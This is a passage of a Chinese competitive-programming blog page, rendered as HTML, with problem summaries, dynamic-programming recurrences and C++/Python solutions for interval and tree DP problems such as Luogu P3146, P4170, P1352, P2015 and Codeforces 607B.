punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span>                           dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">+=</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><h4 id="P3146-248G"><a href="#P3146-248G" class="headerlink" title="P3146 248G"></a><a href="https://www.luogu.com.cn/problem/P3146">P3146 248G</a></h4><ul><li><p>题意：<br>给定一个数组，期间相等的数字可以两两合并，问最大的合并出的数字是多少。</p></li><li><p>题解：<br>这题可以一眼看出是区间DP。$dp[i][j]$表示区间$[i,j]$能合并出的最大的值。转移方程：</p><p>  枚举$[i,j]$之间的$k$，当$dp[i][k]==dp[k+1][j]$ 时 $dp[i][j]=max(dp[i][k]+1,dp[i][j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4170-涂色"><a href="#P4170-涂色" class="headerlink" title="P4170 涂色"></a><a href="https://www.luogu.com.cn/problem/P4170">P4170 涂色</a></h4><ul><li><p>题意：<br>求最少的染色次数。</p></li><li><p>题解：<br>$dp[i][j]$表示区间$[i,j]$为一个颜色的最少涂色次数。状态转移方程为：</p></li></ul><pre><code>$$dp[i][j]=\left\&#123;\begin&#123;aligned&#125;&amp;min(dp[i+1][j],dp[i][j-1]),if(s[i]==s[j])\\&amp;min(dp[i][j],dp[i][k]+dp[k+1][j]),k \in [i,j)\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> s<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="CF-607B"><a href="#CF-607B" class="headerlink" title="CF 607B"></a><a href="https://codeforces.com/problemset/problem/607/B">CF 607B</a></h4><ul><li><p>题意：<br>定义每次操作能消除一个回文子序列，问消除所有数组的最小操作数是多少。</p></li><li><p>题解：<br>$dp[i][j]$表示消除区间$[i,j]$的最小操作数是多少，则存在状态转移方程：</p></li></ul><pre><code>$$\left\&#123;\begin&#123;aligned&#125;&amp;dp[i][i]=1\\&amp;dp[i][i+1]=1+(num[i]\not =&#123;num[i+1]&#125;)\\&amp;dp[i][j]=min(dp[i][k]+dp[k+1][j],dp[i][j]),k \in [i,j)\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="树与图上的动态规划"><a href="#树与图上的动态规划" class="headerlink" title="树与图上的动态规划"></a><a href="https://www.luogu.com.cn/training/214#problems">树与图上的动态规划</a></h3><h4 id="P1352-没有上司的舞会"><a href="#P1352-没有上司的舞会" class="headerlink" title="P1352 没有上司的舞会"></a><a href="https://www.luogu.com.cn/problem/P1352">P1352 没有上司的舞会</a></h4><ul><li><p>题意：<br>给一棵树和树上n个节点的权值，父节点和子节点不能同时取，问最大权值和是多少。</p></li><li><p>题解：<br>$dp[i][0]$表示不取第$i$个节点的最大权值和，$dp[i][1]$表示取第$i$个节点的最大权值和则有状态转移方程:</p></li></ul><pre><code>$$\left\&#123;\begin&#123;aligned&#125;&amp;dp[u][0]+=max(dp[v][0],dp[v][1])    \\&amp;dp[u][1]+=dp[v][0]\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> rec<span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> rec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    rec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        rec<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> rt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            rt <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2015-二叉苹果树"><a href="#P2015-二叉苹果树" class="headerlink" title="P2015 二叉苹果树"></a><a href="https://www.luogu.com.cn/problem/P2015">P2015 二叉苹果树</a></h4><ul><li><p>题意：<br>给一棵树和树上$n-1$个边的权值，问如何取边才能做到最大化权值和。</p></li><li><p>题解：<br>$dp[i][j]$第$i$个节点下的子树取 $k$ 个边所能取到的最大权值和。则有状态转移方程:</p></li></ul><p>$dp[u][k]=max(dp[u][k],dp[v][j]+dp[u][k-j-1]+mp[u][v]),k \in [1,q],j \in [0,k-1]$</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> q<span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vis<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> q<span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span 